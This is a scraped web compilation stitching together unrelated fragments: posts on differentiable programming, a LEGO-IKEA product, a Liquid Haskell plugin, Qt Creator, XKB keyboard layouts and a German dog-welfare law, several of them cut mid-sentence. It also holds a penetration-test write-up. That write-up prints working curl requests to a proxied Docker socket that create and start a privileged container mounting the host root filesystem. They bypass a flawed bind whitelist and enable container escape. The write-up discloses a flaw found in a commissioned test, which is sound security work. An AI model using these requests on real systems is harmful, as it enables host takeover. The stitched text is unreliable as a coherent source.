<p>Alright, but how can we get this magical number? The trick is a process called <a href="https://github.com/FluxML/Zygote.jl">algorithmic differentiation</a>, which is able to differentiate not only simple formulas like you learned in school, but also <em>programs</em> of any complexity – like our trebuchet simulator. The upshot is that we can take a <a href="https://github.com/Roboneet/Trebuchet.jl">simple simulator</a>, written in Julia and <a href="https://github.com/JuliaDiffEq/DifferentialEquations.jl">DiffEq</a> with no deep learning in mind, and get gradients for it in a single function call.</p>

</code></pre></div></div>

<p>Now we have that, let’s do something interesting with it.</p>

<h2 id="throwing-stuff">Throwing Stuff</h2>

<p>A simple way to use this is to aim the trebuchet at a target, using gradients to fine-tune the angle of release; this kind of thing is common under the name of <em>parameter estimation</em>, and we’ve <a href="https://julialang.org/blog/2019/01/fluxdiffeq">covered examples like it before</a>. We can make things more interesting by going meta: instead of aiming the trebuchet given a single target, we’ll optimise a neural network that can aim it given <em>any</em> target. Here’s how it works: the neural net takes two inputs, the target distance in metres and the current wind speed. The network spits out trebuchet settings (the mass of the counterweight and the angle of release) that get fed into the simulator, which calculates the achieved distance. We then compare to our target, and <em>backpropagate through the entire chain</em>, end to end, to adjust the weights of the network. Our “dataset” is a randomly chosen set of targets and wind speeds.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-flow.png"></p>

<p>A nice property of this simple model is that training it is <em>fast</em>, because we’ve expressed exactly what we want from the model in a fully differentiable way. Initially it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-miss.gif"></p>

<p>After about five minutes of training (on a single core of my laptop’s CPU), it looks like this:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-hit.gif"></p>

<p>If you want to try pushing it, turn up the wind speed:</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-wind.gif"></p>

<p>It’s only off by 16cm, or about 0.3%.</p>

<p>What about just aiming the trebuchet directly? It is easy to do this by gradient descent given that we have gradients. However, this is a slow iterative process that takes around 100ms each time. In contrast, running the neural network takes 5μs (twenty thousand times faster) with only a small loss in accuracy. This “approximate function inversion via gradients” trick is a very general one that can not only be used with dynamical systems, but also lies behind the <a href="https://github.com/lengstrom/fast-style-transfer">fast style transfer</a> algorithm.</p>

<p>This is about the simplest possible control problem, which we use mainly for illustrative purposes. But we can apply the same techniques, in more advanced ways, to classic RL problems as well.</p>

<h2 id="cart-meet-pole">Cart, meet Pole</h2>

<p>A more recognisable control problem is <a href="https://gym.openai.com/envs/CartPole-v0/">CartPole</a>, the “hello world” for reinforcement learning. The task is to learn to balance an upright pole by nudging its base left or right. Our setup is broadly similar to the trebuchet case: a <a href="https://github.com/tejank10/Gym.jl">Julia implementation</a> means we can directly treat the reward produced by the environment as a loss. ∂P allows us to switch seamlessly from model-free to model-based RL.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole-flow.png"></p>

<p>The astute reader may notice a snag. The action space for cartpole – nudge left or right – is discrete, and therefore not differentiable. We solve this by introducing a <em>differentiable discretisation</em>, defined <a href="https://github.com/FluxML/model-zoo/blob/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming/cartpole/DiffRL.jl#L32">like so</a>:</p>

<p>$[[\begin{aligned}
  f(x) &amp;=
    \begin{cases}
    1 &amp; x \ge 0 \\
    -1 &amp; x &lt; 0
    \end{cases} \\
  \frac{df}{dx} &amp;= 1
\end{aligned}]]</p>

<p>In other words, we force the gradient to behave as if [[f]] were the identity function. Given how much the mathematical idea of differentiability already gets abused in ML, it’s perhaps not surprising that we can just cheat here; for training all we need is a signal to inform our pseudo-random walk around parameter space, and the rest is details.</p>

<p>The results speak for themselves. Where RL methods need to train for hundreds of episodes before solving the problem, the ∂P model only needs around 5 episodes to win conclusively.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/cartpole.gif"></p>

<h2 id="the-pendulum--backprop-through-time">The Pendulum &amp; Backprop through Time</h2>

<p>An important aim for RL is to handle <em>delayed reward</em>, when an action doesn’t help us until several steps in the future. ∂P allows this too, and in a very familiar way: when the environment is differentiable, we can actually train the agent using backpropagation through time, just like a recurrent net! In this case the environmental state becomes the “hidden state” that changes between time steps.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/bptt.png"></p>

<p>To demonstrate this technique we looked at the <a href="https://github.com/openai/gym/wiki/Pendulum-v0">pendulum</a> environment, where the task is to swing a pendulum until it stands upright, keeping it balanced with minimal effort. This is hard for RL models; after around 20 episodes of training the problem is solved, but often the route to a solution is visibly sub-optimal. In contrast, BPTT can beat the <a href="https://github.com/openai/gym/wiki/Leaderboard#pendulum-v0">RL leaderboard</a> in <em>a single episode of training</em>. It’s instructive to actually watch this episode unfold; at the beginning of the recording the strategy is random, and the model improves over time. The pace of learning is almost alarming.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-training.gif"></p>

<p>Despite only experiencing a single episode, the model generalises well to handle any initial angle, and has something pretty close to the optimal strategy. When restarted the model looks more like this.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/pendulum-dp.gif"></p>

<p>This is just the beginning; we’ll get the real wins applying DP to environments that are too hard for RL to work with at all, where rich simulations and models already exist (as in much of engineering and the sciences), and where interpretability is an important factor (as in medicine).</p>

<h2 id="the-map-is-not-the-territory">The Map Is Not The Territory</h2>

<p>The limitation of these toy models is that they equate the simulated training environment with the test environment; of course, the real world is not differentiable. In a more realistic model the simulation gives us a coarse outline of behaviour that is refined with data. That data informs (say) the simulated effect of wind, in turn improving the quality of gradients the simulator passes to the controller. Models can even form part of a controller’s forward pass, enabling it to refine its predictions without having to learn system dynamics from scratch. Exploring these new architectures will make for exciting future work.</p>

<h2 id="coda">Coda</h2>

<p>The core idea is that <em>differentiable programming</em>, where we simply write an arbitrary numerical program and optimise it via gradients, is a powerful way to come up with better deep learning-like models and architectures – especially when we have a large library of differentiable code to hand. The toy models described are really only previews, but we hope they give an intuition for how these ideas can be applied in more realistic ways.</p>

<p>Just as functional programming involves reasoning about and expressing algorithms using functional patterns, differentiable programming involves expressing algorithms using differentiable patterns. Many such design patterns have already been developed by the deep learning community, such as for handling control problems or sequence and tree structured data. As the field matures, many more will be invented, and the resulting programs are likely to make even the most advanced current deep learning architectures look crude by comparison.</p>

<p>My sources also tell me that there is also a play-table with studs on the surface and drawers beneath to keep your loose bricks which are great for kids to explore their creativity as well as keeping the place tidy.</p>
<p>The launch for Bygglek is slated to be in October 2020 but a lot of things are in flux now due to the covid-19 pandemic.</p>
<p>Stay tuned!</p>

<p><strong>Playing is crucial for the well-being of both adults and children. Together, LEGO Group and IKEA explore and develop solutions to stimulate play all around the home. The collaboration will result in BYGGLEK.</strong></p>
<p>One year ago, IKEA and LEGO Group&nbsp;partnered up to be creative, exchange knowledge and experiment together with the ambition to develop new solutions to facilitate play in every corner of the home. Research from IKEA and LEGO Group has shown that there’s a demand among children for more playtime with their parents. At the same time, parents believe that playing is essential to their children’s well-being and happiness. Despite this, children and adults encounter several barriers and challenges when it comes to making play happen. Busy schedules and homework are a couple of obstacles, other restrictions like finding the space to play are more evident for adults than for children.</p>
<p>“There’s a conflict between how grown-ups look at organising and how children look at the creative play. Every grown-up has stepped on a Lego brick at night time. But organising LEGO bricks the grown-up way also means ending the play sometimes. Adults sort by typology – socks going into one drawer and belts into another. Kids sort by story, clustering it into different pieces, where you can have a half-built space ship. And in that, you can find the one piece that you need. What if we could turn that perceived mess into something wonderful?”, says Rasmus Buch Løgstrup, designer at LEGO Group.</p>
<p>The different perspectives might lead to that children experience rules, carried out by their parents, stops them from being as creative and playful as they wish. Parents, on the other hand, feel that playing can be a bit too messy at home, making it harder to fulfil other commitments of the everyday. The overlaying ambition between the collaboration between LEGO Group and IKEA is to overcome these kinds of obstacles. The hope is to move away from “no” to “yes” to play, and at the same time show respect to duties of the everyday.</p>
<p>“To do this, systematic thinking becomes key. We know that children continue the story building in their minds long after they have stopped playing with their toys. So we asked ourselves, couldn’t pause and play be a way to enable quick play? We know that children are playing with screens because it’s easy to get started. So what if we could make the LEGO play continue? That would make quick play easier and then build on the play that is continuing in the child’s mind anyway”, says Andreas Fredriksson, designer at IKEA.</p>
<p>To enable playing throughout the home with pauses, a solution across generations is needed. Also, different rooms need different solutions that can change after different phases in life.</p>
<p>“Bringing people together over play and enable more play are things that are key for both us and LEGO Group&nbsp;based on our respective visions, missions and values. That is why we want to explore what can happen when we work together, trying to get more of the many people to say yes to play”, says Andreas Fredriksson, designer at IKEA.</p>
<p>The aim is to sale start the first BYGGLEK products during 2020.</p>

<p>I enjoy working with LH. However, I’d be the very first to confess that it has been incredibly tedious to get to work on <em>existing</em> code bases, for various reasons.</p>
<ol type="1">
<li><p>LH ran <em>one file at a time</em>; it was a hassle to <strong>systematically analyze</strong> all the modules in a single package.</p></li>
<li><p>LH had <em>no notion of packages</em>; it was impossible to <strong>import specifications</strong> across packages.</p></li>
<li><p>LH had <em>no integration</em> with the standard compilation cycle; it was difficult to get robust, <strong>development-time feedback</strong> using <code>ghci</code> based tools.</p></li>
</ol>
<p>I’m delighted to announce the release of <a href="http://ucsd-progsys.github.io/liquidhaskell/">LH version 0.8.10.2</a>.</p>
<p>Thanks to the ingenuity and tireless efforts of our friends <a href="http://www.alfredodinapoli.com/">Alfredo Di Napoli</a> and <a href="https://www.andres-loeh.de/">Andres Loh</a> at <a href="http://www.well-typed.com/">Well-Typed</a> this new version solves all three of the above problems in a single stroke, making it vastly simpler (dare I say, quite straightforward!) to run LH on your Haskell code.</p>
<!-- more -->
<p>Alfredo and Andres’ key insight was that all the above problems could be solved if LH could be re-engineered as a <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/extending_ghc.html#compiler-plugins">GHC Compiler Plugin</a> using hooks that GHC exposes to integrate external checkers during compilation. I strongly encourage you to check out Alfredo’s talk at the <a href="https://icfp20.sigplan.org/details/hiw-2020-papers/1/Liquid-Haskell-as-a-GHC-Plugin">Haskell Implementor’s Workshop</a> if you want to learn more about the rather non-trivial mechanics of how this plugin was engineered. However, in this post, lets look at <em>how</em> and <em>why</em> to use the plugin, in particular, how the plugin lets us</p>
<ol type="1">
<li><p>Use GHC’s dependency resolution to analyze entire packages with minimal recompilation;</p></li>
<li><p>Ship refined type specifications for old or new packages, and have them be verified at client code;</p></li>
<li><p>Use tools like <code>ghci</code> based IDE tooling (e.g.&nbsp;<code>ghcid</code> or <code>ghcide</code> to get interactive feedback),</p></li>
</ol>
<p>all of which ultimately, I hope, make Liquid Haskell easier to use.</p>
<h2 id="analyzing-packages">1. Analyzing Packages</h2>
<p>First, lets see a small “demo” of how to <em>use</em> the plugin to compile a small <a href="https://github.com/ucsd-progsys/lh-plugin-demo"><code>lh-plugin-demo</code></a> package with two modules</p>

<p>which defines a function <code>incr</code> that consumes and returns positive integers, and</p>

<p>which imports <code>Demo.Lib</code> and uses <code>incr</code>.</p>
<h3 id="updating-.cabal-to-compile-with-the-lh-plugin">Updating <code>.cabal</code> to compile with the LH plugin</h3>
<p>To “check” this code with LH we need only tell GHC to use it as a plugin, in two steps.</p>
<ol type="1">
<li>First, adding a dependency to LH in the <code>.cabal</code> file (or <code>package.yaml</code>)</li>
</ol>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell &gt;= 0.8.10</code></pre>
<ol start="2" type="1">
<li>Second, tell GHC to use the plugin</li>
</ol>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>That’s it. Now, everytime you (re-)build the code, GHC will <em>automatically</em> run LH on the changed modules! If you use <code>stack</code> you may have to specify a few more dependencies, as the various packages are not (yet) on stackage, as shown in the <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml">demo <code>stack.yaml</code></a>. No extra dependencies are needede if you use <code>cabal-v2</code>. In both cases, you can use the respective files <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/stack.yaml.github"><code>stack.yaml</code></a> and <a href="https://github.com/ucsd-progsys/lh-plugin-demo/blob/main/cabal.project.github"><code>cabal.project</code></a> point to specific git snapshots if you want to use the most recent versions. If you clone the repo and run, e.g.&nbsp;<code>cabal v2-build</code> or <code>stack build</code> you’ll get the following result, after the relevant dependencies are downloaded and built of course…</p>

<h3 id="benefits">Benefits</h3>
<p>There are a couple of benefits to note immediately</p>
<ul>
<li><p>A plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the installing <em>and</em> checking!</p></li>
<li><p>No need to separately <em>install</em> LH; its part of the regular build.</p></li>
<li><p>GHC’s recompilation machinery ensures that only the relevant modules are checked, e.g.&nbsp;the second time round, LH did not need to analyze <code>Lib.hs</code> only <code>Client.hs</code></p></li>
</ul>
<h2 id="shipping-specifications-with-packages">2. Shipping Specifications with Packages</h2>
<p>While the above is nice, in principle it could have been done with some clever <code>makefile</code> trickery (perhaps?). What I’m much more excited about is that now, for the first time, you can <em>ship refinement type specifications within plain Haskell packages</em>.</p>
<p>For example, consider a different <a href="https://github.com/ucsd-progsys/lh-plugin-demo-client">lh-plugin-demo-client</a> package that uses <code>incr</code> from <code>lh-plugin-demo</code>:</p>

<p>Again, the <code>lh-plugin-demo-client.cabal</code> file need only specify the various dependencies:</p>
<pre><code>  build-depends:
      liquid-base,
      liquidhaskell,
      lh-plugin-demo</code></pre>
<p>and that GHC should use the plugin</p>
<pre><code>  ghc-options: -fplugin=LiquidHaskell</code></pre>
<p>and lo! a plain <code>stack build</code> or <code>cabal v2-build</code> takes care of all the rest.</p>

<h3 id="prelude-specifications">Prelude Specifications</h3>
<p>Did you notice the strange <code>liquid-base</code> dependency in the cabal files?</p>
<p>Previously, LH came installed with a “built-in” set of specifications for various <code>prelude</code> modules. This was <em>hacked</em> inside LH in a rather unfortunate manner, which made these specifications very difficult to extend.</p>
<p>Moving forward, all the refinement specifications e.g.&nbsp;for <code>GHC.List</code> or <code>Data.Vector</code> or <code>Data.Set</code> or <code>Data.Bytestring</code> simply live in packages that <em>mirror</em> the original versions, e.g.&nbsp;<code>liquid-base</code>, <code>liquid-vector</code>, <code>liquid-containers</code>, <code>liquid-bytestring</code>. Each <code>liquid-X</code> package directly <em>re-exports</em> all the contents of the corresponding <code>X</code> package, but with any additional refinement type specifications.</p>
<p>Thus, all the refined types for various prelude operations like <code>(+)</code> or <code>(-)</code> or <code>head</code> and so on, now ship with <code>liquid-base</code> and we add that dependency <strong>instead of</strong> base. Similarly, if you want to verify that <em>your</em> code has no <code>vector</code>-index overflow errors, you simply build with <code>liquid-vector</code> <strong>instead of</strong> <code>vector</code>! Of course, in an ideal, and hopefully not too distant future, we’d directly include the refinement types inside <code>vector</code>, <code>containers</code> or <code>bytestring</code> respectively.</p>
<h3 id="benefits-1">Benefits</h3>
<p>So to recap, the plugin offers several nice benefits with respect to <em>shipping specifications</em></p>
<ul>
<li><p>Refined signatures are bundled together with packages,</p></li>
<li><p>Importing packages with refined signatures automatically ensures those signatures are checked on client code,</p></li>
<li><p>You can (optionally) use refined versions of <code>prelude</code> signatures, and hence, even write refined versions of your favorite <em>custom preludes</em>.</p></li>
</ul>

<p>I saved <em>my</em> favorite part for the end.</p>
<p>What I have enjoyed the most about the plugin is that now (almost) all the GHC-based tools that I use in my regular Haskell development workflow, automatically incorporate LH too! For example, reloading a module in <code>ghci</code> automatically re-runs LH on that file.</p>
<h3 id="ghcid"><code>ghcid</code></h3>
<p>This means, that the mega robust, editor-independent <code>ghcid</code> now automatically produces LH type errors when you save a file. Here’s <code>ghcid</code> running in a terminal.</p>

<p>Qt Creator supports setting multiple shortcuts for the same action now. Do you ever mix up shortcuts because your second-favorite editor uses different ones than Qt Creator? Just open <em>Preferences</em> &gt; <em>Environment</em> &gt; <em>Keyboard</em>, find the action and press <em>Add</em> (as long as you do not introduce a conflict with another shortcut). Personally I added some Emacsey shortcuts for splitting and some other actions to my configuration. (Since I am on a Mac, Ctrl+X is free to use for me.)</p>
<p>If you wonder where some items from the <em>Window</em> menu went: We moved them to a new <em>View</em> menu, which seems to be common to have.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				    
<p>Legend has it that before his death, Harry Houdini once said: “<em>if it is truly possible for someone to return from the afterlife, I will</em>”. Despite of the fact he was a great illusionist and escape artist, it seems this last proof has revealed to be very hard, even for him. Much simpler trying to escape out of a container. Of course a docker container 🙂 … our topic for today.</p>



<p>The danger of exposing “<code>docker.sock</code>” to a docker container is well-known and the security literature is full of examples (one is <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">here</a>) leading to container escape and privilege escalation issues in the host machine. But sometimes this is required (if not even necessary) for legitimate purposes, like creating other containers or pushing configuration settings. While the docker security guidelines advocate to not share the Docker UNIX socket inside a container, at the same time the project developers do not give any advice on how to secure such a kind of configuration whenever it is needed for “<em>good reasons</em>”. And that’s why so many companies that adopt docker and deliver services based on it, still today, suffer from this problem.</p>



<p>For example, last year a customer of us has contracted a security firm to check the robustness of their docker infrastructure. One of their main findings was the file “<code>docker.sock</code>” being mounted within some of their containers, which of course was a sufficient condition to compromise the entire host operating system. In the absence of a strong solution coming from the community, our customer has decided to build its own solution. They created a reverse proxy in front of the Docker UNIX socket file that would add authentication/authorization, and would prevent insecure utilization of the Docker socket itself.</p>



<p>Then they asked us to test the new architecture. This is the story of how the sympathetic Red Timmy has managed to bypass it.</p>



<h3>The architecture</h3>



<p>Before moving forward, we must explain a bit the implementation we have been called to test and a picture should make the job easy enough.</p>



<figure><img loading="lazy" width="1024" height="511" src="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png" alt="" srcset="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png 1024w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-300x150.png 300w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-768x383.png 768w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker.png 1099w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In this architecture there are two UNIX socket files now:</p>



<ul><li><code>/var/run/docker.sock</code> is not exposed within the docker containers anymore. It is readable and writable only for the “<code>root</code>” user and the “<code>docker</code>” group. As you already know the docker engine uses it directly.</li><li><code>/var/run/somethingelse.sock</code> is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “<code>/var/run/docker.sock</code>”. The docker engine remains the only one able to do that.</li></ul>



<p>Then a reverse proxy, running as a privileged user, sits in the middle of these two UNIX socket files. It fetches requests from “<code>/var/run/somethingelse.sock</code>” and determines whether or not these must be forwarded to “<code>/var/run/docker.sock</code>” based on a whitelist of authorized values preemptively saved in a configuration file. For example, a request could be let pass through only if it matches a specific HTTP method (<em>GET</em>, <em>POST</em>, etc…), path (for example “<code>/containers/create</code>”) and/or JSON body.</p>



<p>At the same way the reverse proxy returns the replies from “<code>docker.sock</code>” to “<code>somethingelse.sock</code>” once they are in the pipeline. At first glance the workflow looked fine and flawless.</p>



<h3>Let the dance begin</h3>



<p>Ok, all clear. We have been provided with access to a docker container:</p>



<div><div>
<div><p><code>[root@dockerhost ~]# <strong>docker exec -it 7c4e2742becb bash</strong><br>bash-4.4$</code> &lt;-- container command prompt</p></div>
</div></div>







<p>Also our handsome UNIX socket file is where it is supposed to be:</p>



<p><code>bash-4.4$ <strong>ls –al /var/run/somethingelse.sock</strong><br>srw-------  1 unpriv root 0 Feb 13 11:31 somethingelse.sock</code></p>



<p>Now we must find a way to escape out of there. First thing we try is to leverage the “old” trick as documented in the report that our customer has received from the security firm they had originally contracted:</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong> "</strong>AttachStdout<strong>"</strong>: true,<strong> "</strong>AttachStderr<strong>"</strong>: true,<strong> "</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash”,”Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost<strong>/containers/create</strong></code></p>



<p>The main difference in our command is that instead of establishing a communication channel with “<code>/var/run/docker.sock</code>” (not mounted in the container) we target “<code>/var/run/somethingelse.sock</code>” (which is instead mounted in the container). All the hacking steps are performed with curl. Specifically, as we are communicating with a UNIX domain socket, the “<code>--unix-socket &lt;filename&gt;</code>” option is adopted.</p>



<p>The command above is the same (a bit extended) as specified in the section “<strong><em>Create the container with the mounted volume</em>” </strong>of this online <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">tutorial</a>, which the penetration tester had linked into his report. I strongly suggest you to read that post before going ahead with this one, if you are not familiar with the technique in general. Anyway, even if you are not familiar, below follows a short explanation of what we were trying to do with that command.</p>



<p>Basically, from inside the container we are in, we are trying to <strong>create</strong> another container that, once started, will have the root directory “<strong><code>/</code></strong>”of the host operating system mounted under its “<strong><code>/hostos/</code></strong>” folder. If that can be done, it is game over. Just connecting to the new container and launching the command “<code>chroot /hostos</code>” would provide the attacker with full access to the host operating system and all its files.</p>



<p>In our case instead the reverse proxy replied with:</p>



<p><code>HTTP/1.1 403 Forbidden</code></p>



<p>Honestly it was expected. Something else had to be attempted.</p>



<h3><strong>Time for circumvention</strong></h3>



<p>After a bit of trial and error we understand that the stricter check is performed on the value passed to “<code>Binds</code>”. When we provide the string “<code>/:/hostos</code>” trying to map the filesystem “<code>/</code>” of the host into the “<code>/hostos</code>” directory of the container, the request is rejected because the specified string is not in the whitelist. However we discovered, for example, that “<code>/dev/log:/dev/log</code>” is an accepted value instead. It means the reverse proxy allows us to create a container from inside another container when that value is provided. Of course there is nothing special with using “<code>/dev/log</code>” to bypass the filter. But what if the strings “<code>/:/hostos</code>” and “<code>/dev/log:/dev/log</code>” are both specified as part of the same “<code>Binds</code>” parameter, like below?</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong>"</strong>AttachStdout<strong>"</strong>: true,<strong>"</strong>AttachStderr<strong>"</strong>: true,<strong>"</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash<strong>"</strong>,<strong>"</strong>Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost/containers/create</code></p>



<p>Unexpectedly, the reverse proxy replies with:</p>



<p><code>HTTP/1.1 201 Created<br>Api-Version: 1.39<br>Content-Length: 90<br>Content-Type: application/json<br>Date: Fri, 15 May 2020 08:19:58 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)<p>{"Id":"4fa6bfc84930[...]","Warnings":null}</p></code></p>



<p>So it means we are allowed to create a new container where the root of the host filesystem is mounted into its “<code>/hostos</code>” directory. To confirm that, we manually started the newly created container from the host OS and then accessed it. This was what we got…</p>



<p><code>[root@4fa6bfc84930 opt]# <strong>ls -al /hostos/</strong><br>[...]<br>drwxr-xr-x. 102 root root 8192 May  6 09:08 etc<br>drwxr-xr-x.   6 root root   56 Feb  7  2018 home<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 media<br>drwxr-xr-x.   2 root root    6 Mar 10  2016 mnt<br>drwxr-xr-x.  17 root root 4096 Mar 24  2017 nfs<br>drwxr-xr-x.   7 root root  106 Jan  7  2019 opt<br>dr-xr-xr-x. 375 root root    0 Nov 23 08:23 proc<br>dr-xr-x---.   8 root root 4096 May 14 13:51 root<br>drwxr-xr-x.  35 root root 1140 May  6 09:08 run<br>lrwxrwxrwx.   1 root root    8 Jan 18  2018 sbin -&gt; usr/sbin<br>[...]</code></p>



<p>…meaning that from inside the container we have total control over the entire host OS filesystem, which is what the reverse proxy implementation was attempting to prevent. Good, but how was that possible? Well, let’s have a look once more at the interested part that made the trick possible:</p>



<p><strong><code>"Binds": ["/:/hostos", "/dev/log:/dev/log"]</code></strong></p>



<p>It seems that in case just one of the strings given to the “<code>Binds</code>” parameter is present in the whitelist, the whole check is considered passed, regardless of the presence of other values that are instead not defined in the whitelist configuration. The logic of the reverse proxy was clearly flawed.</p>



<h3><strong>Start the container just created</strong></h3>



<p>So from inside the current container we have managed to create a new one with full access to the host OS filesystem. But we have not executed anything in the host OS yet…and we are still confined within our unprivileged container.</p>



<p><code>bash-4.4$</code></p>



<p>Let’s try to get out of here. First of all let’s see if after its creation we can also start the container from the place where we are now:</p>



<p><code>curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/<strong>4fa6bfc84930</strong>[...]/start</code></p>



<p>As indicated in the <a href="https://docs.docker.com/engine/api/v1.39/#operation/ContainerStart" target="_blank" rel="noreferrer noopener">Docker API</a> the endpoint to target this time is “<code>/containers/{ID}/start</code>”, where ID (in bold above) is the value the reverse proxy has returned to us with the previous request. The reply we get is:</p>



<p><code>HTTP/1.1 204 No Content<br>Api-Version: 1.39<br>Date: Fri, 15 May 2020 08:20:34 GMT<br>Docker-Experimental: false<br>Ostype: linux<br>Server: Docker/18.09.11 (linux)</code></p>



<p>It means we are allowed to do that. So far, so good. Now the high privileged container is started and we want to execute a command in …</p></div></div>

<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>

        <!--?xml version="1.0" encoding="UTF-8"?--><p>In future, a dog’s right to exercise could be enshrined in German law. That’s if a new draft ordinance issued by the Federal Ministry of Agriculture is passed. The law also seeks to improve conditions during the transportation of farm animals.</p><h2>New rules for dog owners, breeders and farm animals in Germany</h2><p>According to the draft regulation, which was seen by the German newspaper Rheinische Post, in future dog owners will have to ensure that their animals are walked at least twice a day, for a total of one hour. They will no longer be permitted to leave their dogs home alone all day or keep them chained up outside; a carer will need to check in on the animal “several times a day”.</p><p>Further rules will also apply specifically to dog breeders. The draft law stipulates that breeders be allowed to look after no more than three bitches with puppies at the same time. There will also be new regulations regarding the size and temperature of whelping boxes.&nbsp;</p><p>Shows with dogs that have been overbred to such an extent that they are in pain or no longer able to “behave appropriately” will be banned, as will those featuring animals whose body parts (such as ears or tail) have been “completely or partially amputated” in a manner contrary to animal welfare.&nbsp;</p><p>For farm animals, the new law stipulates that livestock transports within Germany may not exceed four and a half hours if the animals are directly exposed to temperatures of more than 30 degrees.</p><h2>Animals need movement and environmental stimuli</h2><p>The draft law cites “new 